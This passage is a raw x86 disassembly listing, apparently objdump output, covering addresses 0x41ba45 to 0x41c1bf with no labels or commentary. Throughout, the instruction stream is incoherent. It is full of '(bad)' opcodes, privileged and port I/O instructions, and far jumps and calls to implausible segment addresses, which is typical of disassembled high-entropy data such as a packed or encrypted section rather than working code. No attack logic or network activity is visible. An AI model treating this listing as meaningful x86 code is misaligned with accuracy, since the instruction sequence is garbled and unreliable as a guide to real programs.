  41ba45:	mov    edx,0xfb4ccdf9
  41ba4a:	xor    BYTE PTR [edi+0x24],bh
  41ba4d:	or     BYTE PTR [esi],0xc
  41ba50:	pop    edi
  41ba51:	xchg   bh,bl
  41ba53:	add    esi,DWORD PTR [ebx]
  41ba55:	pop    ebp
  41ba56:	inc    ecx
  41ba57:	enter  0xe659,0xcd
  41ba5b:	lock not BYTE PTR es:[edi-0x5c683127]
  41ba63:	inc    edx
  41ba64:	mov    esi,0x5cf93136
  41ba69:	js     0x41ba93
  41ba6b:	xor    BYTE PTR [edi+0x282ca798],ch
  41ba71:	hlt    
  41ba72:	outs   dx,DWORD PTR ds:[esi]
  41ba73:	xor    esi,esp
  41ba75:	repz xor al,0x34
  41ba78:	mov    eax,0xb7d16dd4
  41ba7d:	popa   
  41ba7e:	ins    BYTE PTR es:[edi],dx
  41ba7f:	in     eax,0x37
  41ba81:	inc    ecx
  41ba82:	pop    ss
  41ba83:	repnz (bad) 
  41ba85:	push   edi
  41ba86:	pop    ss
  41ba87:	(bad)  
  41ba89:	ins    DWORD PTR es:[edi],dx
  41ba8a:	(bad)  
  41ba8b:	lods   eax,DWORD PTR ds:[esi]
  41ba8c:	into   
  41ba8d:	or     DWORD PTR [ecx],esi
  41ba8f:	mov    ecx,0x239b14b7
  41ba94:	push   ebp
  41ba95:	ins    DWORD PTR es:[edi],dx
  41ba96:	xchg   edi,eax
  41ba97:	fcmovbe st,st(2)
  41ba99:	mov    al,0x6a
  41ba9b:	into   
  41ba9c:	jmp    0x4fc5:0x6b89b7c3
  41baa3:	mov    eax,ds:0x24ff0b6
  41baa8:	pop    ss
  41baa9:	scas   eax,DWORD PTR es:[edi]
  41baaa:	jnp    0x41ba5e
  41baac:	jmp    0x41ba33
  41baae:	push   0xfffffff6
  41bab0:	rcr    bl,0xd
  41bab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bab4:	sbb    DWORD PTR [ebx+0x2a],edi
  41bab7:	shl    BYTE PTR [esi-0x1b],0x3d
  41babb:	loop   0x41bb32
  41babd:	(bad)  
  41babe:	aad    0xfa
  41bac0:	jno    0x41bad5
  41bac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bac3:	inc    edi
  41bac4:	xchg   esi,eax
  41bac5:	xor    BYTE PTR [ecx-0x2a2a0177],ah
  41bacb:	add    ebx,edi
  41bacd:	pop    ds
  41bace:	test   BYTE PTR [esi+0xd2b7f93],dl
  41bad4:	int    0x2d
  41bad6:	jnp    0x41bb29
  41bad8:	mov    eax,0x9b862de3
  41badd:	aaa    
  41bade:	mov    esi,0xb6377b1b
  41bae3:	ss jbe 0x41bb45
  41bae6:	(bad)  
  41bae7:	jge    0x41bae9
  41bae9:	xor    BYTE PTR [edi],ah
  41baeb:	xor    eax,0x99b53156
  41baf0:	jp     0x41baa5
  41baf2:	sub    DWORD PTR [edi-0x497c574a],esp
  41baf8:	cdq    
  41baf9:	xchg   edi,eax
  41bafa:	cmp    ebp,DWORD PTR [ecx+0x59]
  41bafd:	and    bh,BYTE PTR [ecx]
  41baff:	xor    BYTE PTR [ecx-0x44c2a9e8],0x13
  41bb06:	lahf   
  41bb07:	scas   eax,DWORD PTR es:[edi]
  41bb08:	xchg   ebp,eax
  41bb09:	ins    BYTE PTR es:[edi],dx
  41bb0a:	ins    DWORD PTR es:[edi],dx
  41bb0b:	int3   
  41bb0c:	addr16 in eax,0x66
  41bb0f:	(bad)  
  41bb11:	mov    edx,0x7704a0f6
  41bb16:	loopne 0x41bb06
  41bb18:	adc    al,ch
  41bb1a:	push   esp
  41bb1b:	in     eax,0xaf
  41bb1d:	xlat   BYTE PTR ds:[ebx]
  41bb1e:	xchg   edi,eax
  41bb1f:	cmp    BYTE PTR [edi+0x37],0x15
  41bb23:	or     edi,ebp
  41bb25:	imul   ebx,DWORD PTR [ebp-0x57],0x175473f
  41bb2c:	pop    ebp
  41bb2d:	jg     0x41bae6
  41bb2f:	mov    bh,0x21
  41bb31:	add    edi,ebx
  41bb33:	nop
  41bb34:	fs retf 0xaebd
  41bb38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb39:	je     0x41bb17
  41bb3b:	add    bl,0x7c
  41bb3e:	std    
  41bb3f:	xor    BYTE PTR [eax-0x5f075ca8],ch
  41bb45:	pop    ebp
  41bb46:	retf   
  41bb47:	xchg   esp,eax
  41bb48:	adc    bl,BYTE PTR [ebx-0x56fb8b46]
  41bb4e:	dec    eax
  41bb4f:	push   0xc6069318
  41bb54:	scas   al,BYTE PTR es:[edi]
  41bb55:	sub    al,0x44
  41bb57:	adc    cl,BYTE PTR [edx+0x6b]
  41bb5a:	lods   al,BYTE PTR ds:[esi]
  41bb5b:	retf   0x661e
  41bb5e:	lods   eax,DWORD PTR ds:[esi]
  41bb5f:	mov    eax,0x56fa311d
  41bb64:	and    BYTE PTR [esi],0xb
  41bb67:	std    
  41bb68:	jle    0x41bb75
  41bb6a:	xor    edi,DWORD PTR [esi+0x25]
  41bb6d:	mov    bl,0xbe
  41bb6f:	push   edx
  41bb70:	dec    ecx
  41bb71:	mov    edi,0xce0a81ce
  41bb76:	xchg   edx,eax
  41bb77:	xchg   ebx,eax
  41bb78:	dec    DWORD PTR [ebx]
  41bb7a:	ret    
  41bb7b:	lods   eax,DWORD PTR cs:[esi]
  41bb7d:	popa   
  41bb7e:	xchg   ebp,eax
  41bb7f:	(bad)  
  41bb80:	sub    BYTE PTR [ebx+0x29],dh
  41bb83:	test   al,0x1c
  41bb85:	jmp    0x8a884d13
  41bb8a:	sbb    BYTE PTR [ebx-0x18895f62],al
  41bb90:	pusha  
  41bb91:	jbe    0x41bb27
  41bb93:	pop    edi
  41bb94:	into   
  41bb95:	loopne 0x41bbb3
  41bb97:	pop    ss
  41bb98:	in     eax,0xa4
  41bb9a:	xchg   ebp,eax
  41bb9b:	cmp    esp,DWORD PTR [edi-0x3f]
  41bb9e:	das    
  41bb9f:	sbb    eax,0xe18d1f05
  41bba4:	pop    edx
  41bba5:	lahf   
  41bba6:	pop    esp
  41bba7:	pop    ecx
  41bba8:	sbb    cl,BYTE PTR [esi]
  41bbaa:	or     bh,ah
  41bbac:	cmp    bh,ch
  41bbae:	das    
  41bbaf:	cmp    dh,BYTE PTR [ebx-0x32]
  41bbb2:	jge    0x41bc0c
  41bbb4:	mov    ebx,0xf25ae9a1
  41bbb9:	stc    
  41bbba:	std    
  41bbbb:	(bad)  
  41bbbc:	jl     0x41bbfc
  41bbbe:	(bad)  
  41bbbf:	mov    ah,0x31
  41bbc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbc2:	leave  
  41bbc3:	div    bh
  41bbc5:	lds    eax,FWORD PTR [eax+0xf]
  41bbc8:	and    eax,0xe186698f
  41bbcd:	jnp    0x41bbe4
  41bbcf:	test   DWORD PTR ds:0xe7b6da0c,ebx
  41bbd5:	xchg   ebp,eax
  41bbd6:	or     DWORD PTR [ecx],eax
  41bbd8:	in     eax,dx
  41bbd9:	ja     0x41bbc6
  41bbdb:	fwait
  41bbdc:	mov    edi,0xdc92348
  41bbe1:	jl     0x41bc25
  41bbe3:	mov    ds:0x5156b950,al
  41bbe8:	clc    
  41bbe9:	pop    ebp
  41bbea:	mov    edi,0x56422acb
  41bbef:	add    dl,BYTE PTR ds:0xddfe8e07
  41bbf5:	mov    esi,0xd40e9c71
  41bbfa:	mov    bl,0xfe
  41bbfc:	int3   
  41bbfd:	repnz popa 
  41bbff:	mov    esp,0x4e133a20
  41bc04:	jg     0x41bbdb
  41bc06:	cs sbb eax,0x4d4d7db4
  41bc0c:	call   0x87cecd7a
  41bc11:	jne    0x41bc41
  41bc13:	xchg   edi,eax
  41bc14:	push   edx
  41bc15:	loopne 0x41bc51
  41bc17:	xor    DWORD PTR [ebp+eiz*2+0x6093fd96],0xaff8e389
  41bc22:	mov    edx,esp
  41bc24:	dec    ebp
  41bc25:	stc    
  41bc26:	push   esi
  41bc27:	pop    ecx
  41bc28:	pop    ss
  41bc29:	mov    ebp,0xaebadeb5
  41bc2e:	retf   0x18f8
  41bc31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc32:	mov    eax,0xdaea8135
  41bc37:	cmp    al,0xa
  41bc39:	inc    eax
  41bc3a:	addr16 loopne 0x41bc64
  41bc3d:	imul   BYTE PTR [edx+ebx*4+0x76]
  41bc41:	and    DWORD PTR [edx-0x6af336be],esp
  41bc47:	ret    0xa009
  41bc4a:	in     eax,dx
  41bc4b:	mov    edi,0x23704f4
  41bc50:	adc    eax,0xddba8d3
  41bc55:	and    al,0x3c
  41bc57:	mov    ah,0xfc
  41bc59:	cmp    eax,0x222fecb1
  41bc5e:	xchg   esp,eax
  41bc5f:	jb     0x41bcd9
  41bc61:	add    eax,DWORD PTR [ebp+0x7106a3fb]
  41bc67:	and    al,BYTE PTR [eax-0x8]
  41bc6a:	push   edi
  41bc6b:	xor    bh,al
  41bc6d:	loope  0x41bc4d
  41bc6f:	inc    edi
  41bc70:	ds mov ch,0xc7
  41bc73:	dec    edi
  41bc74:	push   esi
  41bc75:	mov    ch,0xca
  41bc77:	mov    esp,0x5b407417
  41bc7c:	std    
  41bc7d:	ret    
  41bc7e:	mov    ah,cl
  41bc80:	mov    cs,WORD PTR [ebp+0xf]
  41bc83:	bound  ebp,QWORD PTR [edx-0xe]
  41bc86:	in     eax,0x6a
  41bc88:	inc    edi
  41bc89:	and    dh,BYTE PTR [ecx+0x371e99ba]
  41bc8f:	in     eax,dx
  41bc90:	test   eax,0xae806bae
  41bc95:	sbb    BYTE PTR [ebx-0x51d66837],0xf8
  41bc9c:	jecxz  0x41bcb5
  41bc9e:	pop    ss
  41bc9f:	pop    ebx
  41bca0:	ror    BYTE PTR [ebx-0x1c6d0dd6],cl
  41bca6:	and    esp,DWORD PTR [ebx-0xf]
  41bca9:	(bad)  
  41bcaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcab:	call   0xa594a538
  41bcb0:	xor    cl,BYTE PTR [ecx-0x3f0e9223]
  41bcb6:	mov    ecx,0x983655bd
  41bcbb:	std    
  41bcbc:	and    esp,DWORD PTR [edi-0x36]
  41bcbf:	sbb    ebp,DWORD PTR [ecx]
  41bcc1:	enter  0x1c64,0x9c
  41bcc5:	retf   0x46ee
  41bcc8:	add    edx,ebp
  41bcca:	retf   
  41bccb:	add    bh,BYTE PTR [edx+0xe]
  41bcce:	cmp    al,0x2
  41bcd0:	in     al,0xdc
  41bcd2:	ins    DWORD PTR es:[edi],dx
  41bcd3:	js     0x41bd3a
  41bcd5:	loope  0x41bcdd
  41bcd7:	pop    ax
  41bcd9:	pop    ebp
  41bcda:	pushf  
  41bcdb:	push   esi
  41bcdc:	nop    DWORD PTR [edx-0x35]
  41bce0:	jb     0x41bd0f
  41bce2:	pop    esp
  41bce3:	call   0xc74:0x7caf72ca
  41bcea:	gs test al,0x8e
  41bced:	mul    BYTE PTR [ebp+0x2b]
  41bcf0:	test   al,0xe4
  41bcf2:	xor    BYTE PTR [ecx-0x3c34f239],0x7e
  41bcf9:	inc    ebp
  41bcfa:	sahf   
  41bcfb:	and    ah,dh
  41bcfd:	ins    DWORD PTR es:[edi],dx
  41bcfe:	mov    DWORD PTR [eax+eiz*2],0xe9db773c
  41bd05:	xor    ch,dh
  41bd07:	xchg   ecx,eax
  41bd08:	lds    edx,FWORD PTR [eax+0x58096d7e]
  41bd0e:	or     ecx,edi
  41bd10:	mov    WORD PTR [edi+0x1c],ss
  41bd13:	jbe    0x41bd2a
  41bd15:	fnstcw WORD PTR [ecx+0x2dbf8a96]
  41bd1b:	ja     0x41bd55
  41bd1d:	ins    DWORD PTR es:[edi],dx
  41bd1e:	inc    ebx
  41bd1f:	test   al,0xef
  41bd21:	pop    bp
  41bd23:	pop    edi
  41bd24:	jl     0x41bd01
  41bd26:	or     esp,eax
  41bd28:	mov    bl,0x3b
  41bd2a:	cdq    
  41bd2b:	add    eax,0xaf7be95e
  41bd30:	adc    al,ah
  41bd32:	push   edi
  41bd33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd34:	mov    al,ds:0x57ebd41c
  41bd39:	dec    ebp
  41bd3a:	inc    esi
  41bd3b:	sbb    al,0xc2
  41bd3d:	rcr    DWORD PTR [ebx+0x1],1
  41bd40:	shl    DWORD PTR [edx-0x43ecf27c],1
  41bd46:	aad    0xac
  41bd48:	fcmovnb st,st(1)
  41bd4a:	pop    ds
  41bd4b:	adc    BYTE PTR [edx+0x7d],bh
  41bd4e:	inc    edi
  41bd4f:	push   ss
  41bd50:	test   eax,0xc612e242
  41bd55:	or     al,0x57
  41bd57:	mov    eax,ds:0x99fe738b
  41bd5c:	cld    
  41bd5d:	dec    eax
  41bd5e:	mov    ecx,0x7d280a60
  41bd63:	jb     0x41bdde
  41bd65:	xchg   DWORD PTR [ebp-0x6],edx
  41bd68:	out    0xee,eax
  41bd6a:	and    edx,0xffffffa3
  41bd6d:	xor    BYTE PTR es:[ebx+0x61],0xea
  41bd72:	push   0x63
  41bd74:	leave  
  41bd75:	cmp    dl,BYTE PTR [ebp-0x4869bf36]
  41bd7b:	pop    edx
  41bd7c:	pop    ebx
  41bd7d:	std    
  41bd7e:	and    dl,BYTE PTR [edx]
  41bd80:	adc    ch,bl
  41bd82:	xor    eax,0x716d4763
  41bd87:	push   ebx
  41bd88:	aas    
  41bd89:	add    al,0xc8
  41bd8b:	imul   DWORD PTR [eax+0x3f139f7a]
  41bd91:	lock lods al,BYTE PTR ds:[esi]
  41bd93:	mov    bh,0xb7
  41bd95:	jb     0x41bd28
  41bd97:	call   0xaa33:0xc6c532e5
  41bd9e:	add    edi,DWORD PTR [esi+0x6a]
  41bda1:	sub    al,0x9c
  41bda3:	xchg   BYTE PTR [esi-0x42],bh
  41bda6:	(bad)  
  41bda7:	dec    ebp
  41bda8:	dec    ebp
  41bda9:	jp     0x41bd6d
  41bdab:	data16 jl 0x41bde5
  41bdae:	(bad)  
  41bdaf:	std    
  41bdb0:	xchg   ebp,eax
  41bdb1:	push   0x11
  41bdb3:	in     eax,0x1e
  41bdb5:	leave  
  41bdb6:	jge    0x41bd72
  41bdb8:	mov    ah,0x7d
  41bdba:	retf   0xd88f
  41bdbd:	xor    al,0xed
  41bdbf:	xor    DWORD PTR ds:0x4101aa83,edx
  41bdc5:	jmp    0x12be:0xf3083af0
  41bdcc:	cli    
  41bdcd:	mov    eax,ds:0x9ad3deae
  41bdd2:	jb     0x41bd66
  41bdd4:	inc    DWORD PTR [edx*4-0x52874324]
  41bddb:	pop    ecx
  41bddc:	nop
  41bddd:	lahf   
  41bdde:	repnz cmp al,0x26
  41bde1:	jmp    0x41be62
  41bde3:	pop    ebp
  41bde4:	cmp    edi,edi
  41bde6:	jne    0x41bdcb
  41bde8:	add    DWORD PTR [esi-0x223d567d],eax
  41bdee:	stos   BYTE PTR es:[edi],al
  41bdef:	(bad)  
  41bdf0:	scas   al,BYTE PTR es:[edi]
  41bdf1:	lock jmp 0x41bdbc
  41bdf4:	aad    0xbe
  41bdf6:	jb     0x41be70
  41bdf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdf9:	dec    ebp
  41bdfa:	adc    al,0x85
  41bdfc:	xchg   ebp,eax
  41bdfd:	sub    ebx,DWORD PTR [edx-0x75]
  41be00:	adc    edi,DWORD PTR [ecx+0x33]
  41be03:	repz fnstsw WORD PTR [esi-0x3a148698]
  41be0a:	in     eax,dx
  41be0b:	and    bh,ah
  41be0d:	test   DWORD PTR ds:0x9829bd69,edi
  41be13:	xchg   DWORD PTR [ecx+eiz*1-0xa],eax
  41be17:	xchg   ecx,eax
  41be18:	std    
  41be19:	adc    DWORD PTR [eax+0x11],ecx
  41be1c:	or     edi,DWORD PTR [ebp-0x570f796d]
  41be22:	dec    ebx
  41be23:	into   
  41be24:	mov    ecx,DWORD PTR [eax-0x1f641226]
  41be2a:	stc    
  41be2b:	sbb    eax,0x13df95d2
  41be30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be31:	or     ah,cl
  41be33:	daa    
  41be34:	jl     0x41be39
  41be36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be37:	cdq    
  41be38:	popf   
  41be39:	adc    eax,0x881e200a
  41be3e:	add    eax,0x27f67d74
  41be43:	push   ebx
  41be44:	sub    BYTE PTR es:[ebx+ecx*8-0x687ed6a4],0xcc
  41be4d:	jg     0x41be8a
  41be4f:	jb     0x41bdf7
  41be51:	pop    esp
  41be52:	fdiv   QWORD PTR [edi]
  41be54:	or     ah,BYTE PTR ds:0x9c830922
  41be5a:	xchg   ecx,eax
  41be5b:	xchg   BYTE PTR [edx-0x5b5b4e14],bl
  41be61:	wbinvd 
  41be63:	push   0xbcfa07e6
  41be68:	test   al,0xb7
  41be6a:	sub    dl,al
  41be6c:	push   0xfffffffb
  41be6e:	shr    ah,1
  41be70:	pop    edx
  41be71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be72:	sbb    al,BYTE PTR [esi-0x6983368f]
  41be78:	push   0xfffffff0
  41be7a:	rcl    DWORD PTR [ebx-0x2afc8258],0x58
  41be81:	pop    esp
  41be82:	cwde   
  41be83:	jmp    0xbbe8:0xf5856940
  41be8a:	aas    
  41be8b:	xchg   BYTE PTR [ecx-0x3d3bdd45],dl
  41be91:	in     eax,0xc6
  41be93:	add    al,0x88
  41be95:	sub    dh,BYTE PTR [esi]
  41be97:	clc    
  41be98:	xchg   ebx,edx
  41be9a:	push   ebp
  41be9b:	pusha  
  41be9c:	mov    ebp,0x930ef34
  41bea1:	popa   
  41bea2:	inc    ebx
  41bea3:	xor    ah,BYTE PTR [eax+ecx*2-0x80]
  41bea7:	retf   0xfffa
  41beaa:	lahf   
  41beab:	add    bh,ch
  41bead:	mov    edi,0xbea7265e
  41beb2:	daa    
  41beb3:	mov    eax,ds:0x804e18f9
  41beb8:	imul   ebp,DWORD PTR ds:0xf8543c19,0x7b
  41bebf:	mov    dh,0x1b
  41bec1:	popa   
  41bec2:	cmp    al,dh
  41bec4:	aas    
  41bec5:	inc    edi
  41bec6:	ret    0x5f4f
  41bec9:	jb     0x41bea5
  41becb:	xchg   esi,eax
  41becc:	and    edx,DWORD PTR [eax]
  41bece:	dec    edx
  41becf:	xchg   dl,dl
  41bed1:	ret    
  41bed2:	mov    edi,0xbfc64d67
  41bed8:	fwait
  41bed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beda:	mov    BYTE PTR [edx+edi*4-0x5da4f815],bl
  41bee1:	out    0x2e,eax
  41bee3:	sbb    al,0x7
  41bee5:	jp     0x41beb4
  41bee7:	lahf   
  41bee8:	and    al,0xbe
  41beea:	iret   
  41beeb:	push   es
  41beec:	mov    cl,0x63
  41beee:	aad    0x7b
  41bef0:	add    al,0x47
  41bef2:	or     eax,0xfa6199df
  41bef7:	pop    ss
  41bef8:	cli    
  41bef9:	and    esi,DWORD PTR [ebx]
  41befb:	or     DWORD PTR [ebx-0x3c],0xd0ee3da4
  41bf02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf03:	int3   
  41bf04:	cmc    
  41bf05:	sbb    ecx,ebp
  41bf07:	aad    0xe2
  41bf09:	popf   
  41bf0a:	push   edx
  41bf0b:	loop   0x41bf69
  41bf0d:	rcl    BYTE PTR [esi+0x41],cl
  41bf10:	fsubr  st,st(2)
  41bf12:	mov    eax,ds:0xc6c3e28d
  41bf17:	pop    esi
  41bf18:	sub    DWORD PTR [esp+ebx*8+0x4bd479a],0xdb31b1fe
  41bf23:	push   ecx
  41bf24:	push   ds
  41bf25:	repnz adc ecx,ebp
  41bf28:	add    esi,DWORD PTR [esi+0x187a34fe]
  41bf2e:	jbe    0x41bf97
  41bf30:	out    dx,eax
  41bf31:	mov    bh,0x6c
  41bf33:	fisttp QWORD PTR [eax-0x6ae81349]
  41bf39:	or     eax,0xfad664c4
  41bf3e:	pushf  
  41bf3f:	outs   dx,BYTE PTR ds:[esi]
  41bf40:	jge    0x41bfbf
  41bf42:	jl     0x41bfb0
  41bf44:	pop    es
  41bf45:	dec    ebx
  41bf46:	xchg   ebp,eax
  41bf47:	mov    eax,0x879d187e
  41bf4c:	and    cl,BYTE PTR [edi-0x6fa7e9fc]
  41bf52:	jnp    0x41bf62
  41bf54:	add    eax,0x1130f3a8
  41bf59:	pop    edi
  41bf5a:	sub    al,0x94
  41bf5c:	enter  0xf7cd,0x52
  41bf60:	pop    ebp
  41bf61:	outs   dx,DWORD PTR ds:[esi]
  41bf62:	or     esp,DWORD PTR [edi+0x40a6e4c7]
  41bf68:	xor    DWORD PTR [eax+0x3b],esp
  41bf6b:	shl    DWORD PTR [esi+edi*2],0xce
  41bf6f:	int    0x90
  41bf71:	inc    ebp
  41bf72:	mov    cl,0x73
  41bf74:	aas    
  41bf75:	mov    dh,0x3
  41bf77:	mov    DWORD PTR [ebx-0x20],edx
  41bf7a:	sub    BYTE PTR [ebp+0xc],al
  41bf7d:	add    al,0x64
  41bf7f:	jmp    0x890f648a
  41bf84:	inc    ebp
  41bf85:	test   dl,ch
  41bf87:	psadbw mm0,mm4
  41bf8a:	rcl    BYTE PTR [eax-0x7e97c24d],0x6e
  41bf91:	cwde   
  41bf92:	push   eax
  41bf93:	fs cmc 
  41bf95:	pop    edx
  41bf96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf97:	xchg   esi,eax
  41bf98:	mov    bh,0xac
  41bf9a:	loope  0x41bf32
  41bf9c:	jp     0x41bf78
  41bf9e:	push   ebp
  41bf9f:	rol    BYTE PTR [eax],cl
  41bfa1:	push   ebp
  41bfa2:	out    dx,eax
  41bfa3:	mov    WORD PTR [ebp-0x72a9ba01],fs
  41bfa9:	aas    
  41bfaa:	cli    
  41bfab:	add    edi,edi
  41bfad:	mov    esi,edx
  41bfaf:	and    dl,bh
  41bfb1:	xchg   ebp,eax
  41bfb2:	test   al,0xa5
  41bfb4:	sbb    al,0x65
  41bfb6:	or     ebp,DWORD PTR [ecx+0x58]
  41bfb9:	mov    ds:0x956c3884,al
  41bfbe:	adc    dl,BYTE PTR [edi]
  41bfc0:	cli    
  41bfc1:	aad    0x53
  41bfc3:	adc    eax,0xbe0f23b0
  41bfc8:	dec    edx
  41bfc9:	mov    DWORD PTR [esi-0x10],edx
  41bfcc:	sbb    BYTE PTR [edi+0xc],0x89
  41bfd0:	xchg   DWORD PTR [ebp-0x3f],edx
  41bfd3:	call   0x1f73:0x6d7057c7
  41bfda:	or     BYTE PTR [ebx],dh
  41bfdc:	inc    ecx
  41bfdd:	add    DWORD PTR [ebp-0x11],esp
  41bfe0:	mov    dh,BYTE PTR [ecx-0x63120bbc]
  41bfe6:	dec    ebx
  41bfe7:	mov    al,0xd6
  41bfe9:	xor    DWORD PTR [edi+0xc1e4001],0x4878ddd4
  41bff3:	and    BYTE PTR [eax+edx*8+0xdf7c9d2],0x7c
  41bffb:	sub    DWORD PTR [eax-0x7],ebx
  41bffe:	sub    bl,BYTE PTR [edx-0x24]
  41c001:	call   0x47afbbb1
  41c006:	rol    BYTE PTR [ebp+esi*1-0x27f0395e],cl
  41c00d:	pushf  
  41c00e:	push   esp
  41c00f:	out    dx,eax
  41c010:	xchg   DWORD PTR [eax+0x16],ecx
  41c013:	loopne 0x41c064
  41c015:	cwde   
  41c016:	push   ebx
  41c017:	mov    dl,0x3d
  41c019:	in     al,0x8f
  41c01b:	pop    edi
  41c01c:	sahf   
  41c01d:	jae    0x41c08c
  41c01f:	add    al,0xbd
  41c021:	inc    esi
  41c022:	ret    0x79c
  41c025:	push   cs
  41c026:	sbb    eax,0xe70981f1
  41c02b:	add    eax,0x49309185
  41c030:	jns    0x41c0a7
  41c032:	js     0x41c0ae
  41c034:	jb     0x41c051
  41c036:	cdq    
  41c037:	in     eax,dx
  41c038:	inc    edi
  41c039:	les    edx,FWORD PTR [ebx+0xe4ce202]
  41c03f:	dec    eax
  41c040:	and    ebx,eax
  41c042:	dec    esi
  41c043:	xor    al,0x7e
  41c045:	daa    
  41c046:	push   eax
  41c047:	repz (bad) [ecx-0x2b]
  41c04b:	inc    edx
  41c04c:	dec    esp
  41c04d:	inc    eax
  41c04e:	ret    0x1d51
  41c051:	sti    
  41c052:	sub    al,0x71
  41c054:	xor    eax,0xea03e3e3
  41c059:	aam    0xf1
  41c05b:	dec    esp
  41c05c:	sub    BYTE PTR [esi+0x302ccf90],0x3d
  41c063:	mov    eax,0x8d3eb067
  41c068:	lock mov ds:0x4718e446,al
  41c06e:	or     bh,BYTE PTR [eax-0x196c2b0b]
  41c074:	pusha  
  41c075:	shr    BYTE PTR [edx+0x2a],cl
  41c078:	xor    BYTE PTR [eax],ah
  41c07a:	sub    cl,BYTE PTR [edx]
  41c07c:	out    0x1d,eax
  41c07e:	(bad)  
  41c07f:	sahf   
  41c080:	and    al,0x38
  41c082:	jb     0x41c05d
  41c084:	ret    0xd465
  41c087:	and    BYTE PTR [ebx+0x7c7724cc],bh
  41c08d:	sbb    eax,0x4e27128
  41c092:	adc    ebx,eax
  41c094:	stos   DWORD PTR es:[edi],eax
  41c095:	mov    al,ds:0xf553148d
  41c09a:	je     0x41c043
  41c09c:	pop    ebp
  41c09d:	push   cs
  41c09e:	or     BYTE PTR [edi+eax*1+0x33f00ea7],al
  41c0a5:	aaa    
  41c0a6:	or     ebp,0x578dbfea
  41c0ac:	or     bl,BYTE PTR [ebp+esi*2-0x20b543b6]
  41c0b3:	rcr    edx,1
  41c0b5:	addr16 pop es
  41c0b7:	cs std 
  41c0b9:	lods   eax,DWORD PTR ds:[esi]
  41c0ba:	adc    ebx,DWORD PTR [ecx]
  41c0bc:	nop
  41c0bd:	jecxz  0x41c05d
  41c0bf:	sub    BYTE PTR [edx-0x452eb380],0x6b
  41c0c6:	or     eax,0x1ea00ee2
  41c0cb:	adc    BYTE PTR [edi-0x7d3e88be],dl
  41c0d1:	out    dx,eax
  41c0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0d3:	ret    0xfbd8
  41c0d6:	inc    ebx
  41c0d7:	hlt    
  41c0d8:	push   0x4b3d731e
  41c0dd:	sub    BYTE PTR [ecx+0x6ceb5f7b],dl
  41c0e3:	sbb    BYTE PTR [edi-0x6],bl
  41c0e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0e7:	aas    
  41c0e8:	imul   ebp,DWORD PTR [esi+0x549d1eb7],0xffffffeb
  41c0ef:	and    eax,0xf3e5757c
  41c0f4:	adc    al,0x4c
  41c0f6:	lods   eax,DWORD PTR ds:[esi]
  41c0f7:	inc    esp
  41c0f8:	or     eax,0xcb7d217e
  41c0fd:	mov    DWORD PTR [ebp-0x191a8089],ebp
  41c103:	inc    ecx
  41c104:	(bad)  
  41c105:	xor    ebp,DWORD PTR [edx-0x2f496abe]
  41c10b:	add    eax,ebp
  41c10d:	es retf 0x6d2c
  41c111:	xor    edi,0xaef885ba
  41c117:	test   BYTE PTR [eax-0x3e9556b2],cl
  41c11d:	fbstp  TBYTE PTR [ebx+0x24]
  41c120:	sbb    al,0x5d
  41c122:	retf   0xecdf
  41c125:	aas    
  41c126:	hlt    
  41c127:	cmp    ebp,ecx
  41c129:	pop    ebx
  41c12a:	mov    dl,0x69
  41c12c:	test   eax,0xe58adcf2
  41c131:	dec    ecx
  41c132:	pop    ebp
  41c133:	test   al,0xd5
  41c135:	dec    DWORD PTR [edx+0x2990c2da]
  41c13b:	cmp    DWORD PTR [edi-0x3eed28b2],eax
  41c141:	out    dx,al
  41c142:	sbb    al,dh
  41c144:	adc    bl,BYTE PTR [edx-0x409065cd]
  41c14a:	(bad)  ds:0x557d046c
  41c150:	dec    esi
  41c151:	sbb    BYTE PTR [ebx+0x66dadd78],dh
  41c157:	pop    es
  41c158:	ss or  al,0x73
  41c15b:	cmp    esp,esi
  41c15d:	ret    0x6c11
  41c160:	xchg   BYTE PTR [ecx+0x4f3e1719],bl
  41c166:	cmp    al,0xa6
  41c168:	jp     0x41c0f5
  41c16a:	retf   0xa3d3
  41c16d:	std    
  41c16e:	(bad)  
  41c170:	push   esp
  41c171:	sahf   
  41c172:	jle    0x41c189
  41c174:	jne    0x41c122
  41c176:	imul   ebp,DWORD PTR [edx],0xffffffb5
  41c179:	gs cmp al,0xe2
  41c17c:	das    
  41c17d:	mov    ds:0xa668fb75,eax
  41c182:	mov    esi,DWORD PTR [ebp+0x3442c903]
  41c188:	dec    edi
  41c189:	jo     0x41c16a
  41c18b:	out    dx,eax
  41c18c:	lea    esp,[esi+0x21]
  41c18f:	stos   BYTE PTR es:[edi],al
  41c190:	cdq    
  41c191:	push   ss
  41c192:	cmp    BYTE PTR [ebx+0x50],dh
  41c195:	pop    edi
  41c196:	(bad)  
  41c197:	out    dx,eax
  41c198:	cmp    DWORD PTR [eax],esi
  41c19a:	and    al,0xb2
  41c19c:	imul   esp,DWORD PTR [esi+eiz*2-0x3e],0x70
  41c1a1:	pop    ds
  41c1a2:	stos   BYTE PTR es:[edi],al
  41c1a3:	nop
  41c1a4:	jo     0x41c1a4
  41c1a6:	cmp    edx,DWORD PTR [edi-0x11]
  41c1a9:	jge    0x41c15c
  41c1ab:	cwde   
  41c1ac:	cwde   
  41c1ad:	out    0xe2,al
  41c1af:	sbb    al,0x98
  41c1b1:	ret    
  41c1b2:	fwait
  41c1b3:	sub    bh,al
  41c1b5:	xor    BYTE PTR [esi-0x5f89a00b],dh
  41c1bb:	outs   dx,DWORD PTR ds:[esi]
  41c1bc:	popf   
  41c1bd:	(bad)  
  41c1be:	push   ss
  41c1bf:	dec    ecx
